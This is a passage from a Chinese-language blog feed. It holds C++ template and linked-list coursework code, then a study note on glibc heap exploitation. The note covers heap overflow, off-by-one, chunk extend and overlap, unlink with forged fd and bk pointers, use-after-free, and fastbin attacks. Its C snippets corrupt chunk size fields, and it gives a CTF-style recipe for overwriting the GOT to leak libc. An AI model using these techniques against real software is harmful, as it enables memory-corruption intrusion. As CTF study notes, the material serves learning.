class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br>template &lt;typename T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Arithmetic</span> </span><br><span class="hljs-class">&#123;</span><br>private:<br>    T num1;<br>    T num2;<br>public:<br>    Arithmetic(T a, T b)<br>    &#123;<br>        num1=a;<br>        num2=b;<br>    &#125;<br>    T <span class="hljs-title function_">getMax</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">if</span> (num1&gt;num2)<br>            <span class="hljs-keyword">return</span> num1;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> num2;<br>    &#125;<br>    T <span class="hljs-title function_">getMin</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">if</span> (num1&lt;num2)<br>            <span class="hljs-keyword">return</span> num1;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> num2;<br>    &#125;<br>    T <span class="hljs-title function_">add</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">return</span> num1 + num2;<br>    &#125;<br>    T <span class="hljs-title function_">subtract</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">return</span> num1 - num2;<br>    &#125;<br>    T <span class="hljs-title function_">multiply</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">return</span> num1 * num2;<br>    &#125;<br>    T <span class="hljs-title function_">divide</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-keyword">return</span> num1 / num2;<br>    &#125;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">pprint</span><span class="hljs-params">()</span> <br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; getMax() &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; getMin() &lt;&lt; <span class="hljs-string">&quot; &quot;</span> <br>             &lt;&lt; add() &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; subtract() &lt;&lt; <span class="hljs-string">&quot; &quot;</span> <br>             &lt;&lt; multiply() &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; divide();<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> int1, int2;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; int1 &gt;&gt; int2;<br>    Arithmetic&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">intArith</span><span class="hljs-params">(int1, int2)</span>;<br>    <span class="hljs-type">double</span> double1, double2;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; double1 &gt;&gt; double2;<br>    Arithmetic&lt;<span class="hljs-type">double</span>&gt; <span class="hljs-title function_">doubleArith</span><span class="hljs-params">(double1, double2)</span>;<br>    intArith.pprint();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    doubleArith.pprint();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="模板的语法及使用"><a href="#模板的语法及使用" class="headerlink" title="模板的语法及使用"></a>模板的语法及使用</h3><h4 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std; <br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function">T <span class="hljs-title">maxx</span><span class="hljs-params">(T a,T b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (a&gt;b)<br>        <span class="hljs-keyword">return</span> a;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a1=<span class="hljs-built_in">maxx</span>(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br><span class="hljs-type">double</span> a2=<span class="hljs-built_in">maxx</span>(<span class="hljs-number">2.5</span>,<span class="hljs-number">3.1</span>);<br>    cout&lt;&lt;a1&lt;&lt;endl;<br>    cout&lt;&lt;a2&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="类模板"><a href="#类模板" class="headerlink" title="类模板"></a>类模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std; <br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    T content;<br>    <span class="hljs-built_in">Box</span>(T c) : <span class="hljs-built_in">content</span>(c) &#123;&#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>    cout&lt;&lt;content&lt;&lt;endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Box&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">intBox</span><span class="hljs-params">(<span class="hljs-number">42</span>)</span></span>;<br><span class="hljs-function">Box&lt;std::string&gt; <span class="hljs-title">strBox</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span>;<span class="hljs-comment">//需要显示说明类型</span><br>intBox.<span class="hljs-built_in">speak</span>();<br>strBox.<span class="hljs-built_in">speak</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单向链表的创建及删除"><a href="#单向链表的创建及删除" class="headerlink" title="单向链表的创建及删除"></a>单向链表的创建及删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ListNode *<span class="hljs-title function_">readlist</span><span class="hljs-params">()</span><span class="hljs-comment">//按输入顺序创建链表</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">head</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">tail</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);<br>        <span class="hljs-keyword">if</span> (a==<span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">new</span>=</span>(<span class="hljs-keyword">struct</span> LiseNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>        new-&gt;data=a;<br>        new-&gt;next=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (head==<span class="hljs-literal">NULL</span>)<br>            head=new;<br>        <span class="hljs-keyword">else</span><br>            tail-&gt;next=new;<br>        tail=new;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-keyword">struct</span> ListNode *<span class="hljs-title function_">deletem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode *L, <span class="hljs-type">int</span> m)</span> <span class="hljs-comment">//删除链表中值=m的节点</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span> <span class="hljs-title">dummy</span>;</span> <span class="hljs-comment">// 创建一个哑节点</span><br>    dummy.next = L;       <span class="hljs-comment">// 哑节点的 next 指向链表头</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span> *<span class="hljs-title">prev</span> =</span> &amp;dummy; <span class="hljs-comment">// prev 指向哑节点</span><br><br>    <span class="hljs-keyword">while</span> (prev-&gt;next != <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-keyword">if</span> (prev-&gt;next-&gt;data == m) <br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span> *<span class="hljs-title">temp</span> =</span> prev-&gt;next;<br>            prev-&gt;next = temp-&gt;next;<br>            <span class="hljs-built_in">free</span>(temp);<br>        &#125; <br>        <span class="hljs-keyword">else</span> <br>            prev = prev-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dummy.next;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>课内</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆的攻击</title>
    <link href="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/"/>
    <url>/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>简介：</p><ul><li>程序向堆块写入的字节数超过了堆块本身的字节数（<strong>不是用户申请的字节数</strong>，因为在内部用户申请的字节数会被转换为实际向系统申请的字节数，该数大于等于用户申请的字节数），可以<strong>覆盖到相邻的高地址</strong>的下一个堆块</li></ul></li><li><p>条件：</p><ul><li>向堆上写入数据</li><li>写入的数据大小没被良好的控制</li></ul></li></ul><p>与栈溢出等不同的是我们不可以直接通过堆溢出<strong>直接</strong>控制EIP，我们也就无法直接控制程序执行对应的程序，对于堆溢出：</p><ol><li>覆盖下一个chunk的内容<ul><li>pre_size</li><li>size中的三个bit<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the true chunk size</li></ul></li><li>chunk content，改变程序固有执行流</li></ul></li><li>利用堆中unlink来实现任意地址写入或控制堆块的内容等效果来控制程序流</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>寻找堆分配函数<ul><li>通常来说调用malloc来分配，有些时候会使用calloc来分配，区别是<strong>calloc在分配后会自动清空，对于某些信息泄露的漏洞不好</strong></li><li>还有realloc，就是相当于扩充内存块，realloc(ptr,size)<ul><li>size&gt;原来的size<ul><li>chunk与top chunk相邻，直接扩展到目标大小</li><li>不相邻，就分配一个新内存块，并将数据复制过去，原来的那个释放掉</li></ul></li><li>&lt;<ul><li>相差的小于最小的chunk（32为16字节，64为32字节），则保持不变</li><li>大于等于，就切割原来的chunk为两个部分，free掉后面的那个</li></ul></li><li>size&#x3D;0<ul><li>相当于free(ptr)</li></ul></li><li>size&#x3D;ptr的size，不做任何操作</li></ul></li></ul></li><li>寻找危险函数<ul><li>输入<ul><li>gets</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpt，字符串复制</li><li>strcat，字符串拼接</li><li>brocpy，内存块复制</li></ul></li></ul></li><li>确定填充长度<ul><li>这里需要注意填充的长度<strong>并不是程序申请的长度</strong>，因为程序的长度还会在被转换为内部实际需要申请的长度</li><li>64位中 <strong>in_use_size&#x3D;(用户请求大小 +16(pre_size+size)-8(借了下一个chunk的pre_size)) align to 16B</strong></li></ul></li></ul><h1 id="堆中的Off-By-One"><a href="#堆中的Off-By-One" class="headerlink" title="堆中的Off-By-One"></a>堆中的Off-By-One</h1><p>就是溢出时刚好只多了一个字节，往往与边界验证不严和字符串操作有关，比如</p><ul><li>使用循环时次数设置错误</li><li>字符串操作不合适，比如<code>stelen</code>和<code>strcpt</code>不一致时，<code>strlen</code>不会考虑\x00但<code>strcpy</code>会拷贝</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节是可控制的人以字节：通过修改大小造成块之间出现重叠-&gt;泄露数据，或是覆盖数据</li><li>溢出字节是NULL字节：在size&#x3D;0x100时，溢出NULL字节可以让<code>prev_in_use</code>被清理，这样前面的那个块就会被认为是free的，这时<ul><li>可以使用<code>unlink</code>处理</li><li>这是<code>pre_size</code>就会启用，可以伪造它来造成块之间的重叠，这个方法的关键在于unlink没有检查按照<code>pre_size</code>找到的块与<code>pre_size</code>是否一致</li></ul></li></ol><p>在新版本中加入了对方法二的check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><h2 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a>名词解释：</h2><ul><li><code>Chunk Extend</code>:通过修改堆块大小，扩展其范围以覆盖相邻内存</li><li><code>Overlapping</code>:使多个堆块内存区域重叠，通过一个堆块修改另一个堆块的内容</li></ul><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ul><li>程序存在堆漏洞</li><li>漏洞可以控制<code>chunk header</code>（就是<code>size</code>那些数据)中的数据</li></ul><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h2><ul><li>该攻击方式能够实现的原因在于<code>ptmalloc</code>对堆操作时的各种宏</li><li>简而言之，<code>ptmalloc</code>通过<code>chunk header</code>的数据判断<code>chunk</code>的使用情况和对前后<code>chunk</code>进行定位，<code>chunk extend</code>就是通过控制<code>size</code>和<code>pre_size</code>来实现跨越块的操作从而<code>overlapping</code>的</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><ul><li><p>对<code>inuse</code>的<code>fastbin</code>进行<code>extend</code></p><ul><li><p>就是通过第一个块的大小来控制第二个块的内容（演示都是在<strong>64</strong>位环境下）</p></li><li><p>通过修改第一个块的<code>size</code>来在<code>free</code>时将两个块变成一个块，这样在第二次<code>malloc</code>时可以获得第二个块内容</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第一个0x10的chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// 修改第一个块的size域</span><br><br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// 实现 extend，控制了第二个块的内容</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>对<code>inuse</code>的<code>smallbin</code>进行<code>extend</code></p><ul><li>与<code>fastbin</code>方法类似，不过<code>small bin free</code>时会被置于<code>unsorted bin</code>，而且释放时如果与<code>top chunk</code>相连，就会和并到<code>top chunk</code>里</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第二个 0x10 的chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//防止与top chunk合并</span><br><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>对<code>free</code>的<code>small bin</code>进行<code>extend</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span><br><br>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span><br><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<span class="hljs-number">67</span>----<br></code></pre></td></tr></table></figure><ul><li>通过<code>extend</code>后向<code>overlapping</code></li><li>通过<code>extend</code>前向<code>overlapping</code></li></ul><h2 id="Chunk-Extend作用"><a href="#Chunk-Extend作用" class="headerlink" title="Chunk Extend作用"></a>Chunk Extend作用</h2><p>这种技术不能直接控制程序的执行流程，但是可以控制<code>chunk</code>的内容，如果<code>chunk</code>内存在字符串指针或函数指针之类的，就可以通过此来信息泄露和控制程序流</p><p>通过<code>extend</code>来<code>overlapping</code>，通过<code>overlapping</code>可以控制<code>chunk</code>中<code>fd/bk</code>指针从而实现<code>fastbin attack</code>等利用</p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>顾名思义，脱链操作</p><h2 id="unlink原理："><a href="#unlink原理：" class="headerlink" title="unlink原理："></a>unlink原理：</h2><p>对chunk中内容进行布局，接触unlink操作来发成修改指针的目的</p><p>核心</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// P 是要解除链接的空闲堆块</span><br>FD = P-&gt;fd;<br>BK = P-&gt;bk;<br>FD-&gt;bk = BK;  <span class="hljs-comment">// 关键步骤：写入任意地址</span><br>BK-&gt;fd = FD;  <span class="hljs-comment">// 关键步骤：写入任意地址</span><br></code></pre></td></tr></table></figure><p>unlink前：</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1742917802270.png" alt="前"></p><p>unlink后：</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1742917834909.png" alt="后"></p><p>这样就实现了内存块P的脱链</p><h2 id="原始的unlink"><a href="#原始的unlink" class="headerlink" title="原始的unlink"></a>原始的unlink</h2><p>存在有物理空间连续的两个chunk(Q,nextchunk)，Q在使用，Nextchunk释放。那么我们通过溢出等方式将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么在unlink时</p><p>首先是修改堆的数据（下面两句）</p><ul><li>FD&#x3D;P-&gt;fd &#x3D; target addr -12（也就是FD-&gt;bk&#x3D;target addr）</li><li>BK&#x3D;P-&gt;bk &#x3D; expect value（也就是BK&#x3D;expect value）</li></ul><p>然后写入（往target addr写入expect value）</p><ul><li>FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value（就是*target_addr&#x3D;expect value）</li><li>BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12（<strong>这里回破坏expect value+8的值，需要注意</strong>）</li></ul><p>这样就实现了往target addr写入expect value</p><h2 id="现代的unlink"><a href="#现代的unlink" class="headerlink" title="现代的unlink"></a>现代的unlink</h2><p>（只截取了一小部分）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>      <span class="hljs-comment">//检查，如果FD-&gt;bk没指向p或BK-&gt;fd没指向p就不会unlink</span><br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>所以想要伪造fake chunk就必须要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BK-&gt;fd==p&lt;=&gt;p-&gt;fd+<span class="hljs-number">0x18</span>==p<br>FD-&gt;bk==p&lt;=&gt;p-bk+<span class="hljs-number">0x10</span>==p<br><span class="hljs-comment">//这里0x18和0x10分别是BK中bk、FD中fd距离指针的长度（64位）</span><br></code></pre></td></tr></table></figure><p>所以我们伪造的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;fd=P<span class="hljs-number">-0x18</span><br>p-&gt;bk=p<span class="hljs-number">-0x10</span><br></code></pre></td></tr></table></figure><p>才可以进行unlink</p><h2 id="做题中遇到的unlink"><a href="#做题中遇到的unlink" class="headerlink" title="做题中遇到的unlink"></a>做题中遇到的unlink</h2><p>当 got 表可写，并且没有查看堆块信息的函数的时候，并且存在堆溢出的漏洞，并且有一块比如 bss 上的地址来记录堆的指针的情况下，可以利用 unlink 来将free_got写成 puts_plt 来输出地址从而泄露 libcbase</p><p>具体操作（举个例子来说明）</p><ul><li>首先分配三个堆块<ul><li>add(0x10,0x60,0x60)</li></ul></li><li>然后构造aim&#x3D;chunk2_ptr<ul><li>fd&#x3D;aim-0x18</li><li>bk&#x3D;aim-0x10（这样是可以通过检查的，由于存在记录指针的 bss 段地址）</li></ul></li><li>在第二个块里面写上p64(0)+p64(0x50)（chunk2size-0x10）+p64(fd)+p64(bk)+b’A’*(0x60-8*4)+p64(0x50)（pre_size）+p64(0x60)（下一个堆块的size）</li><li>然后 delete(3) 即可将 aim-0x18 写入 chunk2_ptr 的位置上，从而可以控制堆块指针，可以将其修改为 got 表地址，从而修改 got 表地址</li></ul><p>原理就是在 delete(3) 是发现 pre_inuse 为 0，就会去寻找 prechunk，而 pre_size 被我们控制，就会找到我们伪造的chunk，就会对伪造的 chunk 进行 unlink</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>内存块被释放后，其对应指针<strong>没有被设置成NULL</strong></p><ul><li>没有代码对内存块进行修改，那么这个内存块在<strong>下一次使用时程序很有可能可以正常运转</strong></li><li>有代码对其修改，那么在下一次使用时会出现奇怪的问题</li></ul><p><strong>我们称释放后没有被设置成NULL的指针称为dangling pointer</strong></p><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul><li>存在堆溢出，use-after-free等能控制堆中内容的漏洞</li><li>漏洞发生在fastbin的chunk中</li></ul><h2 id="分类"><a href="#分类" 